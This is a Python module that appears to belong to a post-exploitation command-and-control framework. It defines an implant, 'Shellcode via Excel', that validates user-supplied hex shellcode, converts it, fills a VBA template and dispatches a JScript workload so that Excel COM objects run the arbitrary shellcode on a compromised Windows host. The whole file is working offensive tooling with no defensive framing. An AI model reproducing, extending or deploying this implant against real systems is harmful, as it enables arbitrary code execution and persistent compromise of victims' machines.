import core.implant
import core.job
import string

class ExcelShellcodeJob(core.job.Job):
    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        pass
        #self.shell.print_plain(str(self.errno))

class ExcelShellcodeImplant(core.implant.Implant):

    NAME = "Shellcode via Excel"
    DESCRIPTION = "Executes arbitrary shellcode using Excel COM objects"
    AUTHORS = ["zerosum0x0"]
    STATE = "implant/inject/shellcode_excel"

    def load(self):
        self.options.register("SHELLCODE", "90c3", "in ASCII hex format (e.g.: 31c0c3)", required=True)
        self.options.register("SHELLCODEDECCSV", "", "decimal CSV shellcode", hidden=True)
        self.options.register("VBACODE", "", ".vba source", hidden=True)

        # todo: we need to createprocess/remotethread instead of createthread
        # but heres a quick fix that will let us migrate
        self.options.register("SLEEP", "30000", "how long to wait for shellcode to run")

    def job(self):
        return ExcelShellcodeJob

    def run(self):
        shellcode = self.options.get("SHELLCODE")

        if not self.validate_shellcode(shellcode):
            self.shell.print_error("SHELLCODE option is an invalid hex string.")
            return

        self.options.set("SHELLCODEDECCSV", self.convert_shellcode(shellcode))

        vba = self.loader.load_script("data/implant/inject/shellcode.vba", self.options)
        vba = vba.decode().replace("\n", "\\n")

        self.options.set("VBACODE", vba)

        workloads = {}
        workloads["js"] = self.loader.load_script("data/implant/inject/shellcode_excel.js", self.options)

        self.dispatch(workloads, self.job)
